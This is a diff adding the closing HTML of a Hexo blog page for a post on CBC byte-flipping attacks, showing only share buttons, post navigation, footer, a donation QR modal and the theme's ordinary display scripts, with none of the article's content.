+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/47995/&title=《CBC字节翻转攻击》 — Somnus's blog&source=几个月之前就碰到了这类题，但是一直没搞懂，最近做ctf又碰到了，赶紧研究了一番，总算是搞懂了" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/47995/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《CBC字节翻转攻击》 — Somnus's blog&url=https://Foxgrin.github.io/posts/47995/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/47995/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/7108/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：nctf-Web
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/63286/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：Bugkuctf-Web(3)">下一篇：Bugkuctf-Web(3)</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/47995/&title=《CBC字节翻转攻击》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/47995/&title=《CBC字节翻转攻击》 — Somnus's blog&source=几个月之前就碰到了这类题，但是一直没搞懂，最近做ctf又碰到了，赶紧研究了一番，总算是搞懂了" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/47995/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《CBC字节翻转攻击》 — Somnus's blog&url=https://Foxgrin.github.io/posts/47995/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/47995/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABzklEQVR42u3aQY6DMAwFUO5/aWY7iwG+bRKh0cuqagN97SKyvzmOeJ2/1v2eZH9yt9HCxcUdc8/bdbXnilj9ltyAi4u7n5scTFf7r26dv58YcHFxv8xNrron4uLi/j/uPf2hQIn/Dlxc3C9w84Mmjz/yn72kV8PFxR1w85Ry3esl+S4uLm6LexZXNdqYhKR/XIWLi7uFmx8oZ2v1QtKHkAUXF3cxNwk9e61OtSmK7oCLi7uFWw1MJ91VHrg0SxxcXNxl3F7hkpQy1Rj0shjCxcVdzK0OMKr0Xiv10Pzg4uJu4VaLm/zH9Eqil2sxXFzcaVJRGKwmoUlyVf4X4OLi7uEmF1ePsF78moxjcXFxd3LzAiVnJZ9WH+DAxcXdw10RmM4boYejExcX9wPc+0NqMsOpjmFwcXH3c/MmJGmWknCk94gGLi7ufu5kONobwNwffMck8sXFxW1xz+J6t1kqt0a4uLhbuJNHInpxaiH+qM6EcXFxX+XOD6/8gKsOX8unLy4u7qvc8khjPGTNA9bLfBcXF/cz3EmTk4ek5dQEFxf3A9xqe1MdzV7ux8XF3cjtjUaq0UY+fG3OhHFxcV/i9gafvdYo2Z+UULi4uMu4P0cU4jHHqk6tAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
